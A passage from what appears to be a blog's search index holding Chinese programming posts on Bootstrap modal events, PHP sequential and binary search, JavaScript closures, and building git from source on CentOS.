      <content type="text"><![CDATA[bootstrap modal操作简单易用， 但是发现当用于弹出不同的编辑页面时，数据总是显示第一次的数据， 查了好久是这样的： //清除弹窗原数据$(“#create_modal”).on(“hidden.bs.modal”, function() { $(this).removeData(“bs.modal”);});另附上modal一些触发函数 事件描述实例show.bs.modal在调用 show 方法后触发。 $(‘#identifier’).on(‘show.bs.modal’, function () { // 执行一些动作…})shown.bs.modal当模态框对用户可见时触发（将等待 CSS 过渡效果完成）。 $(‘#identifier’).on(‘shown.bs.modal’, function () { // 执行一些动作…})hide.bs.modal当调用 hide 实例方法时触发。 $(‘#identifier’).on(‘hide.bs.modal’, function () { // 执行一些动作…})hidden.bs.modal当模态框完全对用户隐藏时触发。 $(‘#identifier’).on(‘hidden.bs.modal’, function () { // 执行一些动作…})&nbsp; &nbsp; &nbsp;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[二分法查找与顺序查找]]></title>
      <url>%2F2015%2F08%2F15%2F%E4%BA%8C%E5%88%86%E6%B3%95%E6%9F%A5%E6%89%BE%E4%B8%8E%E9%A1%BA%E5%BA%8F%E6%9F%A5%E6%89%BE%2F</url>
      <content type="text"><![CDATA[面试过成功京城会遇到算法题，而经常问到直接或间接的的就有查找，本文主要介绍二分法顺查 一、顺序查找 &lt;?php//顺序查找数组中某个数//如从一个数组中找到一个数：34//$arr = array(23,45,67,34,9,34,6)如果查到则输出下标，否则输出查无此数 $arr = array(23,45,67,34,9,34,6);//设一个标志位$flag = false;foreach($arr as $x =&gt; $x_val){ if ($x_val == 34) { echo &apos;arr[&apos;.$x.&apos;]=34&apos;.&quot; “; $flag = true; }}if ($flag==false){ echo “查无此数！”;}?&gt;简单明了 ，但当数据量过大时可能会耗费时间空间等等，所以就有了二分法的概念 二、二分法 首先找到数组中间这个数，然后与要查找的数比较，如果要查找的数大于中间这个数，则说明应该向后找，否则向前找，如果想等，则说明找到。前提：该数组必须是有序数列，如果该数组无序，必须先排序后查找 &lt;?php//二分查找数组中某个数//如从一个数组中找到一个数：134//$arr = array(23,45,67,89,90,134,236)如果查到则输出下标，否则输出查无此数 function binarySearch(&amp;$arr,$val,$leftindex,$rightindex){ if($rightindex &lt; $leftindex) { echo “查无此数！”; return 0; } //四舍五入取整数值 $middleindex = round(($leftindex + $rightindex)/2); if($val &gt; $arr[$middleindex]) { binarySearch($arr,$val,$middleindex + 1,$rightindex); } elseif($val &lt; $arr[$middleindex]) { binarySearch($arr,$val,$leftindex,$middleindex - 1); } else { echo ‘arr[‘.”$middleindex”.’]=134’.”“; }} $arr = array(23,45,67,89,90,134,236); sort（$arr）;//先排序// $leftindex = 0;左下标// $rightindex = count($arr)-1;右下标// $val = 134;要找的值 binarySearch($arr,134,0,count($arr) - 1)?&gt;此处应用了递归，但是快速定位，大大提高效率！]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[JS之闭包]]></title>
      <url>%2F2015%2F02%2F19%2Fjs%E4%B9%8B%E9%97%AD%E5%8C%85%2F</url>
      <content type="text"><![CDATA[闭包（closure）是Javascript语言的一个难点，也是它的特色，很多高级应用都要依靠闭包实现。下面就是我的学习笔记，对于Javascript初学者应该是很有用的。一、变量的作用域要理解闭包，首先必须理解Javascript特殊的变量作用域。变量的作用域无非就是两种：全局变量和局部变量。Javascript语言的特殊之处，就在于函数内部可以直接读取全局变量。 var n=999; function f1(){ alert(n); } f1(); // 999另一方面，在函数外部自然无法读取函数内的局部变量。 function f1(){ var n=999; } alert(n); // error&nbsp; 这里有一个地方需要注意，函数内部声明变量的时候，一定要使用var命令。如果不用的话，你实际上声明了一个全局变量！ function f1(){ n=999; } f1(); alert(n); // 999&nbsp; 二、如何从外部读取局部变量？出于种种原因，我们有时候需要得到函数内的局部变量。但是，前面已经说过了，正常情况下，这是办不到的，只有通过变通方法才能实现。那就是在函数的内部，再定义一个函数。 function f1(){ var n=999; function f2(){ alert(n); // 999 } }在上面的代码中，函数f2就被包括在函数f1内部，这时f1内部的所有局部变量，对f2都是可见的。但是反过来就不行，f2内部的局部变量，对f1就是不可见的。这就是Javascript语言特有的”链式作用域”结构（chain scope），子对象会一级一级地向上寻找所有父对象的变量。所以，父对象的所有变量，对子对象都是可见的，反之则不成立。既然f2可以读取f1中的局部变量，那么只要把f2作为返回值，我们不就可以在f1外部读取它的内部变量了吗！ function f1(){ var n=999; function f2(){ alert(n); } return f2; } var result=f1(); result(); // 999三、闭包的概念上一节代码中的f2函数，就是闭包。各种专业文献上的”闭包”（closure）定义非常抽象，很难看懂。我的理解是，闭包就是能够读取其他函数内部变量的函数。由于在Javascript语言中，只有函数内部的子函数才能读取局部变量，因此可以把闭包简单理解成”定义在一个函数内部的函数”。所以，在本质上，闭包就是将函数内部和函数外部连接起来的一座桥梁。四、闭包的用途闭包可以用在许多地方。它的最大用处有两个，一个是前面提到的可以读取函数内部的变量，另一个就是让这些变量的值始终保持在内存中。怎么来理解这句话呢？请看下面的代码。 function f1(){ var n=999; nAdd=function(){n+=1} function f2(){ alert(n); } return f2; } var result=f1(); result(); // 999 nAdd(); result(); // 1000在这段代码中，result实际上就是闭包f2函数。它一共运行了两次，第一次的值是999，第二次的值是1000。这证明了，函数f1中的局部变量n一直保存在内存中，并没有在f1调用后被自动清除。为什么会这样呢？原因就在于f1是f2的父函数，而f2被赋给了一个全局变量，这导致f2始终在内存中，而f2的存在依赖于f1，因此f1也始终在内存中，不会在调用结束后，被垃圾回收机制（garbage collection）回收。这段代码中另一个值得注意的地方，就是”nAdd=function(){n+=1}”这一行，首先在nAdd前面没有使用var关键字，因此nAdd是一个全局变量，而不是局部变量。其次，nAdd的值是一个匿名函数（anonymous function），而这个匿名函数本身也是一个闭包，所以nAdd相当于是一个setter，可以在函数外部对函数内部的局部变量进行操作。五、使用闭包的注意点1）由于闭包会使得函数中的变量都被保存在内存中，内存消耗很大，所以不能滥用闭包，否则会造成网页的性能问题，在IE中可能导致内存泄露。解决方法是，在退出函数之前，将不使用的局部变量全部删除。2）闭包会在父函数外部，改变父函数内部变量的值。所以，如果你把父函数当作对象（object）使用，把闭包当作它的公用方法（Public Method），把内部变量当作它的私有属性（private value），这时一定要小心，不要随便改变父函数内部变量的值。六、思考题如果你能理解下面两段代码的运行结果，应该就算理解闭包的运行机制了。 代码片段一。 var name = “The Window”; var object = { name : “My Object”, getNameFunc : function(){ return function(){ return this.name; }; } }; alert(object.getNameFunc()()); 代码片段二。 var name = “The Window”; var object = { name : “My Object”, getNameFunc : function(){ var that = this; return function(){ return that.name; }; } }; alert(object.getNameFunc()());&nbsp;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Centos系统git1.7升级]]></title>
      <url>%2F2015%2F02%2F15%2Fcentos%E7%B3%BB%E7%BB%9Fgit1-7%E5%8D%87%E7%BA%A7%2F</url>
      <content type="text"><![CDATA[应用centos系统时，总有git报错，版本过低不能操作巴拉巴拉。。。 安装需求：># yum install curl-devel expat-devel gettext-devel openssl-devel zlib-devel asciidoc ># yum install gcc perl-ExtUtils-MakeMaker error: ```/utf8.c:463: undefined reference to `libiconv'``` ># wget http://ftp.gnu.org/pub/gnu/libiconv/libiconv-1.14.tar.gz ># tar zxvf libiconv-1.14.tar.gz ># cd libiconv-1.14 ># ./configure --prefix=/usr/local/libiconv ># make && make install 卸载centos自带的git1.7:通过git –version查看系统带的版本，Cento6.5应该自带的是git版本是1.7.1 ># yum remove git &nbsp; ### 下载git2.2.1并将git添加到环境变量中（版本自选 [https://github.com/git/git/releases](https://github.com/git/git/releases)） ># wget https://github.com/git/git/archive/v2.2.1.tar.gz ># tar zxvf v2.2.1.tar.gz ># cd git-2.2.1 ># make configure ># ./configure --prefix=/usr/local/git --with-iconv=/usr/local/libiconv ># make all doc ># make install install-doc install-html ># echo "export PATH=$PATH:/usr/local/git/bin" >> /etc/bashrc ># source /etc/bashrc 查看版本号&gt;# git –version git version 2.2.1ok，解决，再次执行git命令就不会提示版本过低了！！]]></content>
    </entry>

    
  
  
</search>
